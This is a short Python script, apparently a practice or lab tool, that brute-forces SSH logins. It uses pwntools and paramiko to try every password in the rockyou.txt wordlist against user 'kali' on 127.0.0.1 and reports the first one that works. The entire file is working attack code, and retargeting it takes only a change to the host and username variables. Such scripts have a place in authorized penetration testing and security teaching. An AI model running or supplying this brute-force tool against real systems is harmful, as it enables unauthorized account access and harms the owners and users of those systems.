from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempt = 0
wordlist_path = "/usr/share/wordlists/rockyou.txt"

try:
	with open(wordlist_path, "r", encoding = 'latin-1') as wordlist:
		for word in wordlist: 
			try:
				word = word.strip('\n')
				print("[{}] Attempting password: '{}'!".format(attempt, word))
				response = ssh(host = host, user = username, password = word, timeout = 1) # from pwntools
				if response.connected():
					print("[>] Valid password found: '{}'!".format(word))
					response.close()
					break
				else:
					response.close()
			except paramiko.ssh_exception.AuthenticationException:
				print("[X] Invalid Password!")
			attempt += 1
except:
	raise